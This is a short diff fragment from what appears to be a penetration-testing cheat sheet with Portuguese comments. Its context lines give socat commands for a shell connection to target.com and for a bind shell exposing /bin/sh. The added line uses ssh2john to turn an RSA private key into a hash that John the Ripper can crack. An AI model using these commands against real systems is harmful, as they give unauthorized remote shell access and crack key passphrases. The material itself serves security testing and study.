@@ -217,6 +217,8 @@ socat FILE:`tty`,raw,echo=0 TCP:target.com:12345
 LPORT=12345
 socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane   #bind shell com socat
 
+ssh2john <inputfilersa> > <outputfile.hash> #Fazer o john entender a chave rsa como um hash
+
 
 
 
